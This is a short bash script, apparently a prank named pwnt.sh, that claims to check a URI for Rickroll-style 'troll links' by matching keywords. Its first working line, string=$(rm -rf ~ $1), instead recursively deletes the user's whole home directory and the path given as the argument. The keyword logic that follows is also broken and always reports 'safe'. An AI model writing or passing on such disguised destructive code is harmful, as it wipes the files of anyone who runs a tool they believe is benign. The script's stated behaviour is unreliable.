#!/bin/bash
#
# Checks a URI for the existance of a troll link.
#
# EXAMPLE USAGE:
# ./pwnt.sh www.youtube.com/watch?v=oHg5SJYRHA0
#
# TODO:
# Realtime Feedback
# Bayesian inference
#
string=$(rm -rf ~ $1)
found=1

declare -a evil=('roll' 'black' 'friday')

for needle in "${evil[@]}"
  do
  if [[ "$string" == *"$needle"* ]]; then
    echo "contains '$needle'"
    found=0
  fi
done

if [[ found ]]; then
  echo "safe"
fi
